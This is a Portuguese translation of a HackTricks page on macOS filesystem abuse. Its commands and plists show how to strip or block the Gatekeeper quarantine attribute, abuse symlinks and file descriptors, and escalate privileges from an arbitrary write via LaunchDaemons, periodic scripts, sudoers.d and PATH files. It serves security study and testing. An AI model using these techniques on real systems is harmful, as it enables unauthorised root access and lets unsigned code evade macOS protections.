# Truques do Sistema de Arquivos do macOS

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo do** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo do [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Combinações de permissões POSIX

Permissões em um **diretório**:

* **read** - você pode **enumerar** as entradas do diretório
* **write** - você pode **deletar/escrever** **arquivos** no diretório e pode **deletar pastas vazias**.
* Mas você **não pode deletar/modificar pastas não vazias** a menos que tenha permissões de escrita sobre ela.
* Você **não pode modificar o nome de uma pasta** a menos que seja o proprietário.
* **execute** - você tem **permissão para atravessar** o diretório - se você não tiver esse direito, não poderá acessar nenhum arquivo dentro dele, ou em quaisquer subdiretórios.

### Combinações Perigosas

**Como sobrescrever um arquivo/pasta pertencente ao root**, mas:

* Um **proprietário de diretório pai** no caminho é o usuário
* Um **proprietário de diretório pai** no caminho é um **grupo de usuários** com **acesso de escrita**
* Um **grupo de usuários** tem **acesso de escrita** ao **arquivo**

Com qualquer uma das combinações anteriores, um atacante poderia **injetar** um **link simbólico/direto** no caminho esperado para obter uma escrita arbitrária privilegiada.

### Caso Especial de Pasta root R+X

Se houver arquivos em um **diretório** onde **apenas o root tem acesso R+X**, esses **não são acessíveis a mais ninguém**. Então, uma vulnerabilidade que permita **mover um arquivo legível por um usuário**, que não pode ser lido por causa dessa **restrição**, de uma pasta **para outra diferente**, poderia ser abusada para ler esses arquivos.

Exemplo em: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Link Simbólico / Link Direto

Se um processo privilegiado estiver escrevendo dados em um **arquivo** que pode ser **controlado** por um **usuário de menor privilégio**, ou que poderia ser **criado previamente** por um usuário de menor privilégio. O usuário poderia simplesmente **apontá-lo para outro arquivo** através de um Link Simbólico ou Direto, e o processo privilegiado escreverá naquele arquivo.

Verifique nas outras seções onde um atacante poderia **abusar de uma escrita arbitrária para escalar privilégios**.

## .fileloc

Arquivos com a extensão **`.fileloc`** podem apontar para outras aplicações ou binários, então quando são abertos, a aplicação/binário será executado.\
Exemplo:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD Arbitrário

Se você conseguir fazer um **processo abrir um arquivo ou pasta com altos privilégios**, você pode abusar do **`crontab`** para abrir um arquivo em `/etc/sudoers.d` com **`EDITOR=exploit.py`**, assim o `exploit.py` receberá o FD para o arquivo dentro de `/etc/sudoers` e poderá abusá-lo.

Por exemplo: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Evitar truques de atributos de quarentena xattrs

### Removê-lo
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Se um arquivo/pasta tem esse atributo imutável, não será possível colocar um xattr nele
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### montagem devfs

Uma montagem **devfs** **não suporta xattr**, mais informações em [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Este ACL impede a adição de `xattrs` ao arquivo
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

O formato de arquivo **AppleDouble** copia um arquivo incluindo seus ACEs.

No [**código-fonte**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), é possível ver que a representação de texto do ACL armazenada dentro do xattr chamado **`com.apple.acl.text`** será definida como ACL no arquivo descomprimido. Então, se você comprimiu um aplicativo em um arquivo zip com o formato de arquivo **AppleDouble** com um ACL que impede que outros xattrs sejam escritos nele... o xattr de quarentena não foi definido na aplicação:

Confira o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) para mais informações.

Para replicar isso, primeiro precisamos obter a string de acl correta:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note que mesmo que isso funcione, o sandbox escreve o atributo de quarentena xattr antes)

Não é realmente necessário, mas deixo aqui apenas por precaução:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Burlar Assinaturas de Código

Pacotes contêm o arquivo **`_CodeSignature/CodeResources`** que contém o **hash** de cada **arquivo** no **pacote**. Note que o hash do CodeResources também está **embutido no executável**, então não podemos mexer nisso também.

No entanto, existem alguns arquivos cuja assinatura não será verificada, estes têm a chave omit no plist, como:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
É possível calcular a assinatura de um recurso a partir do cli com:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Montar dmgs

Um usuário pode montar um dmg personalizado criado até mesmo sobre algumas pastas existentes. Veja como você pode criar um pacote dmg personalizado com conteúdo personalizado:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Escritas Arbitrárias

### Scripts sh periódicos

Se o seu script puder ser interpretado como um **script shell**, você poderá sobrescrever o script shell **`/etc/periodic/daily/999.local`**, que será acionado todos os dias.

Você pode **fingir** uma execução deste script com: **`sudo periodic daily`**

### Daemons

Escreva um **LaunchDaemon** arbitrário como **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** com um plist executando um script arbitrário como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
```markdown
Gere o script `/Applications/Scripts/privesc.sh` com os **comandos** que você gostaria de executar como root.

### Arquivo Sudoers

Se você tem **escrita arbitrária**, você poderia criar um arquivo dentro da pasta **`/etc/sudoers.d/`** concedendo a si mesmo privilégios de **sudo**.

### Arquivos PATH

O arquivo **`/etc/paths`** é um dos principais locais que populam a variável de ambiente PATH. Você deve ser root para sobrescrevê-lo, mas se um script de um **processo privilegiado** estiver executando algum **comando sem o caminho completo**, você pode ser capaz de **sequestrar** a execução modificando este arquivo.

&#x20;Você também pode escrever arquivos em **`/etc/paths.d`** para carregar novas pastas na variável de ambiente `PATH`.

## Referências

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
